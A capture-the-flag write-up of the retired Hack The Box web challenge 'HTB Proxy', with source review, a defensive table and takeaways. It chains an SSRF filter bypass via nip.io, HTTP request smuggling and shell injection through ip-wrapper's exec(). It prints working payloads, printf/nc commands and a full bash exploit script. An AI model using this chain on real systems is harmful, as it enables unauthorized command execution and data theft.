---
title: "Hack The Box Challenge — HTB Proxy"
summary: "HTB Proxy chains a DNS-based SSRF filter bypass, HTTP request smuggling and shell command injection to expose a randomized flag file."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Medium"
solvedAt: 2026-09-12
publishedAt: 2026-09-12
tags:
  - web-security
  - ssrf
  - http-request-smuggling
  - command-injection
  - parser-differential
  - dns-filter-bypass
  - source-code-review
tools:
  - tree
  - curl
  - Netcat
cves: []
htbUrl: "https://app.hackthebox.com/challenges/HTB%2520Proxy"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge HTB Proxy. The user explicitly confirmed retirement and publication eligibility on 12 September 2026, and supplied a screenshot of the retired challenge page with its official write-up available. The flag, ephemeral target address, internal container address, container hostname and unrelated personal information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

HTB Proxy is a white-box Web challenge built around a custom Go HTTP proxy and an internal Express API. The proxy exposes a diagnostic endpoint, validates the destination from the `Host` header, blocks requests containing `flushinterface`, scans POST bodies for suspicious characters and then forwards the original bytes to the selected backend.

The controls fail when combined. `/server-status` discloses the container's private address. A wildcard DNS hostname encodes that address with hyphens, bypassing a blacklist that looks only for dotted private-network prefixes. The proxy then parses and validates only the first request in a TCP buffer but forwards the entire buffer. A second request can therefore reach the blocked `/flushInterface` route without being inspected. Finally, `ip-wrapper` interpolates the submitted interface name into a shell command, allowing command injection.

The verified exploit used the injection to copy the randomized flag into the HTML file served at `/`. A final GET returned an HTB-formatted value. The value itself is omitted.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `HTB Proxy` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Medium |
| Status | Retired, confirmed 12 September 2026 |
| Exposed service | Custom HTTP proxy on an ephemeral public port |
| Internal service | Express API on TCP port `5000` |
| Core chain | Information disclosure → SSRF filter bypass → HTTP request smuggling → OS command injection |

The scenario described an abandoned army base whose only reachable host ran a custom HTTP proxy. That wording made proxy destination validation, HTTP parsing and access to internal services the highest-priority review targets.

## Provided material and evidence boundaries

The challenge package contained ten files:

```text
.
├── build_docker.sh
├── challenge
│   ├── backend
│   │   ├── index.js
│   │   └── package.json
│   └── proxy
│       ├── go.mod
│       ├── includes
│       │   └── index.html
│       └── main.go
├── config
│   └── supervisord.conf
├── Dockerfile
├── entrypoint.sh
└── flag.txt
```

The package was used locally for source review but is not included in this repository. The preserved evidence consists of the file tree, numbered source listings, deployment configuration, live HTTP requests and responses, the request-smuggling proof, and the final flag-recovery response. Small excerpts are reproduced only where they explain the vulnerability.

The remote host, port, private address and hostname are represented by placeholders. The retirement screenshot is retained as solve evidence outside the repository but is not published because it includes account-specific interface details.

## Initial analysis

The first directory inspection mistake was unrelated to the challenge but useful to correct before source review:

```bash
tree ../../"HTB Proxy"/
```

```text
../../HTB Proxy/  [error opening dir]
0 directories, 0 files
```

From `~/Hackthebox/HTB Proxy`, `../../` resolves to the home directory, so the command searched for `~/HTB Proxy`. The actual challenge directory was one level above its own basename, making this command correct:

```bash
tree "../HTB Proxy"/
```

Once the package structure was confirmed, the review focused on `challenge/proxy/main.go`, `challenge/backend/index.js`, `Dockerfile`, `entrypoint.sh` and `config/supervisord.conf`.

### The proxy trust boundary

The Go service listens on port `1337`, reads at most 1,024 bytes from each accepted connection and calls its custom parser exactly once:

```go
buffer := make([]byte, 1024)
length, err := frontendConn.Read(buffer)
requestBytes := buffer[:length]
request, err := requestParser(requestBytes, remoteAddr)
```

After its checks, it opens a TCP connection using the supplied `Host` header and writes the original bytes rather than a reconstructed request:

```go
backendConn, err := net.Dial("tcp", host)
_, err = backendConn.Write(requestBytes)
```

That distinction became critical: the security checks operate on one parsed `HTTPRequest`, but the backend receives every byte from the initial read.

### The internal API

The Node application exposes two POST routes on port `5000`:

```javascript
app.post("/getAddresses", async (req, res) => {
    const addr = await ipWrapper.addr.show();
    res.json(addr);
});

app.post("/flushInterface", validateInput, async (req, res) => {
    const { interface } = req.body;
    const addr = await ipWrapper.addr.flush(interface);
    res.json(addr);
});
```

`validateInput` rejects an empty value, a non-string value and any interface containing a literal space. It does not constrain the value to a real interface-name grammar and does not reject shell metacharacters.

The proxy separately rejects any URL whose lowercase form contains `flushinterface`. Directly requesting the dangerous route is therefore blocked before the request reaches Express.

### Deployment details

The Dockerfile copies the flag to `/flag.txt`. The entrypoint renames it at container startup:

```sh
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
```

The result matches `/flag*.txt`, but its exact name cannot be known in advance. Supervisor starts both the Go proxy and Node backend as `root`. The proxy serves `/app/proxy/includes/index.html` whenever the public root path is requested. These facts provided a same-origin exfiltration target: write command output into that HTML file, then fetch `/` normally.

## Identifying the weaknesses

The challenge depends on four distinct weaknesses crossing three trust boundaries.

### 1. Internal address disclosure

The public `/server-status` handler calls `GetServerInfo()`, enumerates non-loopback IPv4 addresses and returns them to the client. The executed request was:

```bash
curl -s -i http://<TARGET_HOST>:<TARGET_PORT>/server-status
```

The useful part of the response was:

```http
HTTP/1.1 200 OK
Server: HTB proxy
Content-Type: text/plain

Hostname: <REDACTED>, Operating System: linux, Architecture: amd64,
CPU Count: 64, Go Version: go1.21.10, IPs: <INTERNAL_IP>
```

This converted an unknown internal destination into a known private container address.

### 2. DNS-based SSRF filter bypass

The proxy validates the textual host with either an IPv4 or domain-name regular expression. Its blacklist searches for literal strings equivalent to:

```text
localhost
0.0.0.0
127.
172.
192.
10.
```

It then resolves the accepted value and rejects only addresses for which Go's `IsLoopback()` returns true. Private non-loopback destinations are not rejected after resolution.

A `nip.io` hostname can encode an IPv4 address with hyphens. For example, the sanitized form:

```text
<INTERNAL-IP-WITH-HYPHENS>.nip.io
```

contains no dotted private prefix, passes `isDomain()`, and resolves back to the private address. The proxy therefore opens a connection to the internal Express service on port `5000`.

The executed SSRF probe was:

```bash
curl -s -i --max-time 15 --http1.1 \
  http://<TARGET_HOST>:<TARGET_PORT>/getAddresses \
  -H 'Host: <INTERNAL-IP-WITH-HYPHENS>.nip.io:5000' \
  -H 'Connection: close' \
  --data ''
```

The API operation itself failed, but its response proved that the request crossed the proxy and reached Express:

```http
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{"message":"Error getting addresses"}
```

The `401` was application output, not a failed SSRF. `X-Powered-By: Express` and the route-specific JSON were the decisive signals.

### 3. Request parsing differential

For POST requests, `requestParser()` splits the entire buffer at every `\r\n\r\n`, treats only `bodySplit[1]` as the request body and checks it against the first request's `Content-Length`:

```go
bodySplit := strings.Split(string(requestBytes), "\r\n\r\n")
bodyContent := bodySplit[1]

if len(bodyContent) != contentLengthInt {
    return nil, fmt.Errorf("invalid content length")
}
```

The URL blacklist and malicious-body patterns are then applied only to this parsed first request. Later segments are ignored by the checks. Because the proxy forwards the unchanged buffer, a second HTTP request after another header delimiter remains available to Node's HTTP parser.

The proof used a four-byte first body and a harmless nonexistent interface:

```bash
printf 'POST /getAddresses HTTP/1.1\r\nHost: <INTERNAL-IP-WITH-HYPHENS>.nip.io:5000\r\nContent-Length: 4\r\n\r\nabcd\r\n\r\nPOST /flushInterface HTTP/1.1\r\nHost: <INTERNAL-IP-WITH-HYPHENS>.nip.io:5000\r\nContent-Type: application/json\r\nContent-Length: 20\r\nConnection: close\r\n\r\n{"interface":"nope"}' \
  | nc -nv -w 10 <TARGET_HOST> <TARGET_PORT>
```

One TCP exchange returned two HTTP responses:

```http
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Connection: keep-alive

{"message":"Error getting addresses"}HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Connection: close

{"message":"Error flushing interface"}
```

The second message could only have come from `/flushInterface`. This confirmed that the route blacklist had been bypassed before any command-injection payload was attempted.

### 4. Shell command injection in `ip-wrapper`

The installed dependency was pinned to `ip-wrapper` version `1.1.1`. Its `flush()` implementation passes a template literal to Node's `child_process.exec()`:

```javascript
function flush(interfaceName) {
    return new Promise((resolve, reject) => {
        exec(`ip address flush dev ${interfaceName}`, (error, stdout, stderr) => {
            // error handling omitted
        });
    });
}
```

Because `exec()` invokes a shell, characters such as `;`, redirection operators and parameter expansions retain their shell meaning. The backend's literal-space check does not prevent `${IFS}` from expanding into whitespace after the shell receives the command.

## Chronological solution

### Building a safe command-injection proof path

The request-smuggling probe deliberately used `nope` rather than a real interface. It established access to the dangerous route without flushing an active interface. The generic `401` was expected because `ip address flush dev nope` fails, but the distinct response body proved execution reached the correct handler.

For the final payload, the interface value began with another nonexistent interface, followed by a command separator:

```text
x;cat${IFS}/flag*.txt>/app/proxy/includes/index.html;#
```

Its shell interpretation is:

```sh
ip address flush dev x
cat /flag*.txt > /app/proxy/includes/index.html
```

The individual elements have specific roles:

- `x` avoids touching a real interface.
- `;` terminates the intended `ip` command and starts a new command.
- `${IFS}` becomes shell whitespace without putting a literal space in the JSON value.
- `/flag*.txt` matches the randomized flag filename created by the entrypoint.
- `>` writes the output into the file served by the proxy's `/` route.
- `#` comments out any trailing shell text.

### Sending the verified exploit

The body was stored in a single-quoted shell variable so that the attacking machine did not expand `${IFS}` locally. Its byte length was calculated dynamically and inserted into the second request:

```bash
body='{"interface":"x;cat${IFS}/flag*.txt>/app/proxy/includes/index.html;#"}'
len=${#body}

printf 'POST /getAddresses HTTP/1.1\r\nHost: <INTERNAL-IP-WITH-HYPHENS>.nip.io:5000\r\nContent-Length: 4\r\n\r\nabcd\r\n\r\nPOST /flushInterface HTTP/1.1\r\nHost: <INTERNAL-IP-WITH-HYPHENS>.nip.io:5000\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s' "$len" "$body" \
  | nc -nv -w 10 <TARGET_HOST> <TARGET_PORT>
```

The server again returned `Error getting addresses` followed by `Error flushing interface`. The latter does not mean the injected operation failed. The initial `ip` command wrote an error for interface `x`, so the wrapper rejected the request after the shell had already executed the later `cat` and redirection.

Finally, the public root page was requested:

```bash
curl -s http://<TARGET_HOST>:<TARGET_PORT>/
```

It returned an HTB-formatted value, confirming both command execution and access to the randomized file. The recovered value and any value-derived hash are intentionally excluded.

## Minimal exploit

The following is the sanitized version of the command sequence that succeeded. It assumes that `/server-status` has already disclosed the private address and that the address has been converted to the dashed `nip.io` form.

```bash
#!/usr/bin/env bash
set -u

target_host="${1:?usage: $0 TARGET_HOST TARGET_PORT INTERNAL_IP_DASHED}"
target_port="${2:?usage: $0 TARGET_HOST TARGET_PORT INTERNAL_IP_DASHED}"
internal_ip_dashed="${3:?usage: $0 TARGET_HOST TARGET_PORT INTERNAL_IP_DASHED}"
backend_host="${internal_ip_dashed}.nip.io:5000"

body='{"interface":"x;cat${IFS}/flag*.txt>/app/proxy/includes/index.html;#"}'
length=${#body}

printf 'POST /getAddresses HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\n\r\nabcd\r\n\r\nPOST /flushInterface HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s' \
  "$backend_host" "$backend_host" "$length" "$body" \
  | nc -nv -w 10 "$target_host" "$target_port"

curl -s "http://${target_host}:${target_port}/"
```

This is an article-embedded, parameterized reconstruction of the executed one-liner. The request framing, payload and tools match the successful solve; only the ephemeral addresses were replaced with arguments.

## Validation

Validation occurred at each boundary rather than relying only on the final result:

1. `/server-status` returned the container's non-loopback private address.
2. The dashed `nip.io` hostname produced an Express response from internal port `5000`.
3. The harmless smuggling probe produced two HTTP responses, including the route-specific `Error flushing interface` body.
4. The deployment files confirmed root execution, the randomized `/flag*.txt` path and the writable HTML target.
5. The final payload changed the root page from the default proxy HTML to an HTB-formatted value.

The final platform submission was not captured in the supplied evidence, so this write-up does not claim a separate HTB UI acceptance event.

## Failed approaches and useful errors

### Incorrect relative path

The initial `tree ../../"HTB Proxy"/` command searched the wrong location. Correcting the path exposed the expected ten-file package and allowed the source-first workflow to continue. This was an environment-navigation mistake, not a challenge defense.

### Treating HTTP 401 as a failed SSRF

The first internal `/getAddresses` request returned `401 Unauthorized`. Its Express header and route-specific JSON nevertheless proved that the proxy had connected to the internal service. Status codes need to be interpreted at the component that generated them; here, the `401` came from the backend's exception handler after the SSRF had already succeeded.

### Testing with a nonexistent interface

Both the harmless `nope` probe and final `x` prefix caused `ip-wrapper` to return `Error flushing interface`. That was intentional. Using a genuine container interface could remove live addresses and terminate the lab connection. The nonexistent name preserved service availability while the second response and later file write supplied the required evidence.

## Why the full chain works

Each component validates a different representation of the request:

1. **Textual host versus resolved destination:** the blacklist approves a domain string, while DNS turns that string into a private address afterward.
2. **Parsed request versus forwarded bytes:** the Go code approves one `HTTPRequest` object but forwards bytes it never assigned to that object.
3. **Proxy parser versus backend parser:** Go stops its security analysis after the first body segment; Node continues parsing the same connection and finds another request.
4. **Application string versus shell program:** Express treats `interface` as a string, but `child_process.exec()` interprets it as shell syntax.
5. **Random filename versus wildcard:** renaming the flag hides the exact path but does not prevent a root shell from expanding `/flag*.txt`.

No single bypass directly exposes the flag. The SSRF reaches the backend, smuggling reaches the filtered route, command injection gains a file-read primitive, and the writable public HTML file creates a retrieval channel.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| `/server-status` exposes internal addresses | Remove the public diagnostic route or restrict it to an authenticated administrative network |
| Host validation relies on substring checks | Resolve the destination, reject private, loopback, link-local, multicast and reserved ranges, and connect only to the validated address |
| Arbitrary proxy destinations are accepted | Use a strict allow-list of permitted schemes, hosts and ports instead of a deny-list |
| Custom parser reads once into a fixed buffer | Use Go's standard HTTP server and proxy packages, enforce size limits and parse messages incrementally |
| Unparsed trailing bytes are forwarded | Reconstruct the outbound request from validated fields or reject any bytes remaining after exactly one complete message |
| `interface` enters `child_process.exec()` | Avoid a shell; call the `ip` binary with a fixed argument array and validate the interface against the operating system's interface list |
| Services and static content run as root | Run each service as a dedicated unprivileged user and make served assets read-only |
| Backend errors are hidden behind generic `401` | Return appropriate status codes while logging route, parser and subprocess failures for defenders |

Checking `IsLoopback()` is not enough for an SSRF-capable proxy. Validation must cover every non-public range and must bind the checked address to the eventual connection to avoid DNS changes between validation and use.

## Key takeaways

- Custom HTTP parsing is dangerous because small framing differences become security boundaries when another parser receives the same bytes.
- An error response can still prove successful exploitation of an earlier stage in a multi-component chain.
- SSRF validation must evaluate the resolved destination, not just suspicious substrings in the hostname.
- Route and body filters provide little protection when the proxy forwards data it never parsed or inspected.
- Never interpolate attacker-controlled values into `child_process.exec()`; argument-array process APIs remove an entire class of shell metacharacter attacks.
- Validate a dangerous path with a harmless input before attempting the objective, especially when the vulnerable function can alter network configuration.
- Randomizing a secret's filename is not an authorization control when a privileged process can list or glob the containing directory.

## References

- [Hack The Box — HTB Proxy](https://app.hackthebox.com/challenges/HTB%2520Proxy)
- [nip.io — wildcard DNS for any IP address](https://nip.io/)
- [`ip-wrapper` 1.1.1 `addresses.js`](https://cdn.jsdelivr.net/npm/ip-wrapper@1.1.1/src/addresses.js)
- [RFC 9112 — HTTP/1.1 message syntax and routing](https://www.rfc-editor.org/rfc/rfc9112)
- [OWASP — Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP — OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
